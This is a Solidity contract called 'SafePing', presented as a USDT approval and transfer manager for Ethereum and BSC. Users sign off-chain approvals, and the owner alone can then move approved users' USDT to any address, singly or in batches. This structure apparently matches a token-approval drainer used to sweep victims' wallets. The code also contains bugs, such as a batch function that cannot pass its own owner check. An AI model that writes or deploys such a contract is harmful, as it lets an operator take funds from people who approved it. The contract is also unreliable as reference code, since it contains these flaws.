// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title SafePing
 * @dev Multi-chain smart contract for USDT approval and transfer management
 * @notice Users sign off-chain messages to approve USDT spending, owner can transfer from approved wallets
 * @notice Supports BSC, Ethereum networks
 *
 * Security Features:
 * - Off-chain signature verification for approvals
 * - Only owner can execute transfers
 * - Comprehensive event logging for admin console
 * - Multi-chain USDT contract support
 */

// ERC20 Interface for USDT
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract SafePing {
    /*//////////////////////////////////////////////////////////////
                               STORAGE
    //////////////////////////////////////////////////////////////*/

    // Contract owner
    address public owner;

    // USDT contract address for current chain
    address public usdtContract;

    // Chain identifier (1=ethereum, 56=bsc, 728126428=tron)
    uint256 public chainId;

    // Nonce for signature replay protection
    mapping(address => uint256) public userNonces;

    // Approved users tracking
    mapping(address => bool) public isApprovedUser;
    address[] public approvedUsersList;

    // User allowances tracking
    mapping(address => uint256) public userAllowances;

    /*//////////////////////////////////////////////////////////////
                               EVENTS
    //////////////////////////////////////////////////////////////*/

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event USDTContractUpdated(
        address indexed oldContract,
        address indexed newContract
    );
    event ChainIdUpdated(
        uint256 indexed oldChainId,
        uint256 indexed newChainId
    );
    event UserApproved(address indexed user, uint256 amount, uint256 nonce);
    event UserRevoked(address indexed user);
    event USDTTransferred(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event AllowanceUpdated(
        address indexed user,
        uint256 oldAmount,
        uint256 newAmount
    );

    /*//////////////////////////////////////////////////////////////
                               MODIFIERS
    //////////////////////////////////////////////////////////////*/

    modifier onlyOwner() {
        require(msg.sender == owner, "SafePing: caller is not the owner");
        _;
    }

    modifier validAddress(address _address) {
        require(_address != address(0), "SafePing: zero address not allowed");
        _;
    }

    modifier validAmount(uint256 _amount) {
        require(_amount > 0, "SafePing: amount must be greater than zero");
        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor(
        address _usdtContract,
        uint256 _chainId
    ) validAddress(_usdtContract) {
        owner = msg.sender;
        usdtContract = _usdtContract;
        chainId = _chainId;

        emit OwnershipTransferred(address(0), msg.sender);
        emit USDTContractUpdated(address(0), _usdtContract);
        emit ChainIdUpdated(0, _chainId);
    }

    /*//////////////////////////////////////////////////////////////
                           USDT APPROVAL FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev Approve USDT spending for a user via off-chain signature
     * @param _user User address to approve
     * @param _amount Amount to approve
     * @param _nonce User's current nonce
     * @param _signature User's signature for the approval
     */
    function approveUSDTForUser(
        address _user,
        uint256 _amount,
        uint256 _nonce,
        bytes calldata _signature
    ) external validAddress(_user) validAmount(_amount) {
        // Verify nonce matches user's current nonce
        require(_nonce == userNonces[_user], "SafePing: invalid nonce");

        // Verify signature
        bytes32 messageHash = keccak256(
            abi.encodePacked(_user, _amount, _nonce, chainId, address(this))
        );

        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );

        address signer = recoverSigner(ethSignedMessageHash, _signature);
        require(signer == _user, "SafePing: invalid signature");

        // Update user approval status
        if (!isApprovedUser[_user]) {
            isApprovedUser[_user] = true;
            approvedUsersList.push(_user);
        }

        // Update allowance
        uint256 oldAllowance = userAllowances[_user];
        userAllowances[_user] = _amount;

        // Increment nonce for replay protection
        userNonces[_user]++;

        // Emit events
        emit UserApproved(_user, _amount, _nonce);
        emit AllowanceUpdated(_user, oldAllowance, _amount);
    }

    /**
     * @dev Revoke user's approval (only owner)
     * @param _user User address to revoke
     */
    function revokeUserApproval(
        address _user
    ) external onlyOwner validAddress(_user) {
        require(isApprovedUser[_user], "SafePing: user is not approved");

        // Remove from approved users
        isApprovedUser[_user] = false;
        userAllowances[_user] = 0;

        // Remove from approved users list
        for (uint256 i = 0; i < approvedUsersList.length; i++) {
            if (approvedUsersList[i] == _user) {
                approvedUsersList[i] = approvedUsersList[
                    approvedUsersList.length - 1
                ];
                approvedUsersList.pop();
                break;
            }
        }

        emit UserRevoked(_user);
        emit AllowanceUpdated(_user, userAllowances[_user], 0);
    }

    /*//////////////////////////////////////////////////////////////
                           USDT TRANSFER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev Transfer USDT from approved user to destination (only owner)
     * @param _from User address to transfer from
     * @param _to Destination address
     * @param _amount Amount to transfer
     */
    function transferFromUser(
        address _from,
        address _to,
        uint256 _amount
    )
        external
        onlyOwner
        validAddress(_from)
        validAddress(_to)
        validAmount(_amount)
    {
        // Check if user is approved
        require(isApprovedUser[_from], "SafePing: user is not approved");

        // Check if amount is within approved limit
        require(
            _amount <= userAllowances[_from],
            "SafePing: insufficient allowance"
        );

        // Check if user has sufficient USDT balance
        uint256 userBalance = IERC20(usdtContract).balanceOf(_from);
        require(userBalance >= _amount, "SafePing: insufficient USDT balance");

        // Check if contract has sufficient allowance from user
        uint256 contractAllowance = IERC20(usdtContract).allowance(
            _from,
            address(this)
        );
        require(
            contractAllowance >= _amount,
            "SafePing: insufficient contract allowance"
        );

        // Transfer USDT from user to destination
        bool success = IERC20(usdtContract).transferFrom(_from, _to, _amount);
        require(success, "SafePing: USDT transfer failed");

        // Update allowance tracking
        userAllowances[_from] -= _amount;

        emit USDTTransferred(_from, _to, _amount);
        emit AllowanceUpdated(
            _from,
            userAllowances[_from] + _amount,
            userAllowances[_from]
        );
    }

    /**
     * @dev Batch transfer USDT from multiple users to destinations (only owner)
     * @param _froms Array of user addresses to transfer from
     * @param _tos Array of destination addresses
     * @param _amounts Array of amounts to transfer
     */
    function batchTransferFromUsers(
        address[] calldata _froms,
        address[] calldata _tos,
        uint256[] calldata _amounts
    ) external onlyOwner {
        require(
            _froms.length == _tos.length && _froms.length == _amounts.length,
            "SafePing: array lengths must match"
        );

        for (uint256 i = 0; i < _froms.length; i++) {
            this.transferFromUser(_froms[i], _tos[i], _amounts[i]);
        }
    }

    /*//////////////////////////////////////////////////////////////
                           VIEW FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev Get user's current allowance
     * @param _user User address
     * @return Current allowance amount
     */
    function getUserAllowance(address _user) external view returns (uint256) {
        return userAllowances[_user];
    }

    /**
     * @dev Get user's current nonce
     * @param _user User address
     * @return Current nonce
     */
    function getUserNonce(address _user) external view returns (uint256) {
        return userNonces[_user];
    }

    /**
     * @dev Get all approved users
     * @return Array of approved user addresses
     */
    function getAllApprovedUsers() external view returns (address[] memory) {
        return approvedUsersList;
    }

    /**
     * @dev Get total number of approved users
     * @return Total count
     */
    function getApprovedUsersCount() external view returns (uint256) {
        return approvedUsersList.length;
    }

    /**
     * @dev Get user's USDT balance
     * @param _user User address
     * @return USDT balance
     */
    function getUserUSDTBalance(address _user) external view returns (uint256) {
        return IERC20(usdtContract).balanceOf(_user);
    }

    /**
     * @dev Get contract's allowance from user
     * @param _user User address
     * @return Contract's allowance
     */
    function getContractAllowance(
        address _user
    ) external view returns (uint256) {
        return IERC20(usdtContract).allowance(_user, address(this));
    }

    /**
     * @dev Get total approved USDT amount across all users
     * @return total Total approved amount
     */
    function getTotalApprovedAmount() external view returns (uint256 total) {
        for (uint256 i = 0; i < approvedUsersList.length; i++) {
            total += userAllowances[approvedUsersList[i]];
        }
    }

    /**
     * @dev Get contract information
     * @return contractOwner Contract owner address
     * @return usdtAddress USDT contract address
     * @return currentChainId Current chain ID
     */
    function getContractInfo()
        external
        view
        returns (
            address contractOwner,
            address usdtAddress,
            uint256 currentChainId
        )
    {
        return (owner, usdtContract, chainId);
    }

    /*//////////////////////////////////////////////////////////////
                           ADMIN FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev Update USDT contract address (only owner)
     * @param _newUSDTContract New USDT contract address
     */
    function updateUSDTContract(
        address _newUSDTContract
    ) external onlyOwner validAddress(_newUSDTContract) {
        address oldContract = usdtContract;
        usdtContract = _newUSDTContract;
        emit USDTContractUpdated(oldContract, _newUSDTContract);
    }

    /**
     * @dev Update chain ID (only owner)
     * @param _newChainId New chain ID
     */
    function updateChainId(uint256 _newChainId) external onlyOwner {
        uint256 oldChainId = chainId;
        chainId = _newChainId;
        emit ChainIdUpdated(oldChainId, _newChainId);
    }

    /**
     * @dev Transfer ownership (only owner)
     * @param _newOwner New owner address
     */
    function transferOwnership(
        address _newOwner
    ) external onlyOwner validAddress(_newOwner) {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(oldOwner, _newOwner);
    }

    /*//////////////////////////////////////////////////////////////
                           UTILITY FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev Recover signer from signature
     * @param _hash Message hash
     * @param _signature Signature
     * @return Recovered signer address
     */
    function recoverSigner(
        bytes32 _hash,
        bytes calldata _signature
    ) internal pure returns (address) {
        require(_signature.length == 65, "SafePing: invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := calldataload(_signature.offset)
            s := calldataload(add(_signature.offset, 32))
            v := byte(0, calldataload(add(_signature.offset, 64)))
        }

        if (v < 27) v += 27;
        require(v == 27 || v == 28, "SafePing: invalid signature 'v' value");

        return ecrecover(_hash, v, r, s);
    }

    /**
     * @dev Emergency function to recover any ERC20 tokens sent to contract (only owner)
     * @param _token Token contract address
     * @param _to Recipient address
     * @param _amount Amount to recover
     */
    function emergencyRecoverERC20(
        address _token,
        address _to,
        uint256 _amount
    ) external onlyOwner validAddress(_token) validAddress(_to) {
        IERC20(_token).transfer(_to, _amount);
    }
}
